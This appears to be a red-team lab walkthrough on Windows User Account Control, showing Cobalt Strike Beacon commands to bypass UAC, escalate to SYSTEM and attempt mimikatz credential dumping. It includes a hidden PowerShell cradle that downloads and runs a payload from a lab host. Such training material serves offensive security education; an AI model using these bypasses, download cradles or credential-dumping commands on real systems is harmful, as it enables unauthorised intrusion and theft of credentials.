Veterans of Windows Vista will remember the User Account Control window that popped up every time anything wanted to perform a privileged operation. This was to prevent malicious applications from carrying out actions without the explicit consent of an admin.

By default, applications will run in a Medium Integrity context even if the user is a local administrator. **nlamb** is a member of Domain Admins and subsequently the local administrators group on wkstn-2. However, if you launch the Command Prompt "normally" and attempt to add a new local user, it will fail.

To run the Command Prompt in high integrity, right-click it, select "Run as Administrator" and consent to the UAC dialogue.

Now Command Prompt is running as an administrator (you will often see "Administrator" in the window title) and you can add the local user.

UAC was first introduced in Windows Vista and attracted complaints from users due to the frequency and annoyance of the popups, which led Microsoft to introduce some relaxations. These allow some of their own trusted, signed applications to "auto-elevate" without consent under certain conditions. In many ways, this decision paved the way for many of the loopholes exploited in "UAC bypasses".

The default configuration for UAC is **Prompt for consent for non-Windows binaries**, but can also have different settings such as **Prompt for credentials**, **Prompt for consent** and **Elevate without prompting**.

Seatbelt can be used to query the configuration applied to a machine.
```shell
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac

====== UAC ======

ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
EnableLUA (Is UAC enabled?)    : 1
```

A UAC bypass is a technique by which an application can go from **Medium** to **High Integrity** without prompting for consent. This is not technically an EoP because Microsoft do not consider UAC to be a security boundary; and since the user has to be a local administrator, you're not gaining any privilege that the user is not already allowed to have.

Jump onto the console of **WKSTN-2** and spawn a Beacon as **nlamb**. SharpUp will tell us that we're already a local admin, so UAC can be bypassed.
```shell
beacon> getuid
[*] You are DEV\nlamb

beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.
```

Cobalt Strike provides two means of executing code to bypass UAC. The first is via the `elevate` command, which bootstraps a listener via the chosen technique. The second is via the `runasadmin` command, which allows you to execute any arbitrary command.
```shell
beacon> elevate uac-token-duplication tcp-4444-local
[+] Success! Used token from PID 480
[+] established link to child beacon: 10.10.17.132
```
![[Pasted image 20220831121321.png]]
```shell
beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
```shell
05/10 18:03:39 visit (port 80) from: 10.10.17.132
    Request: GET /b
    page Scripted Web Delivery (powershell)
    null
```
```shell
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.17.132
```

Not all UAC bypasses are created equal - some have "quirks" that you need to be aware of. Seatbelt's `TokenPrivileges` command can list the current token's privileges . A high integrity process may look something like this:

```shell
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges

====== TokenPrivileges ======

                     SeIncreaseQuotaPrivilege:  DISABLED
                          SeSecurityPrivilege:  DISABLED
                     SeTakeOwnershipPrivilege:  DISABLED
                        SeLoadDriverPrivilege:  DISABLED
                     SeSystemProfilePrivilege:  DISABLED
                        SeSystemtimePrivilege:  DISABLED
              SeProfileSingleProcessPrivilege:  DISABLED
              SeIncreaseBasePriorityPrivilege:  DISABLED
                    SeCreatePagefilePrivilege:  DISABLED
                            SeBackupPrivilege:  DISABLED
                           SeRestorePrivilege:  DISABLED
                          SeShutdownPrivilege:  DISABLED
                             SeDebugPrivilege:  SE_PRIVILEGE_ENABLED
                 SeSystemEnvironmentPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                    SeRemoteShutdownPrivilege:  DISABLED
                            SeUndockPrivilege:  DISABLED
                      SeManageVolumePrivilege:  DISABLED
                       SeImpersonatePrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                      SeCreateGlobalPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
                          SeTimeZonePrivilege:  DISABLED
                SeCreateSymbolicLinkPrivilege:  DISABLED
    SeDelegateSessionUserImpersonatePrivilege:  DISABLED
```

A high integrity session gained using Token Duplication looks like this:
```shell
====== TokenPrivileges ======

Current Token's Privileges

                          SeShutdownPrivilege:  DISABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                            SeUndockPrivilege:  DISABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
                          SeTimeZonePrivilege:  DISABLED
```

and this will cause actions that require privileged access to still fail.
```shell
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 296058 bytes
[+] received output:
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

So even though we're in a high integrity session, we really can't do much. `elevate svc-exe` can be used to execute another Beacon as SYSTEM by utilising the Service Control Manager.
```shell
beacon> elevate svc-exe tcp-4444-local
Started service 96d0481 on .
[+] established link to child beacon: 10.10.17.132
```
![[Pasted image 20220831121454.png]]

This Beacon will have the necessary token privileges to run post-ex command such as `logonpasswords`. The moral of this story is to research into the specific bypass techniques before you use them.
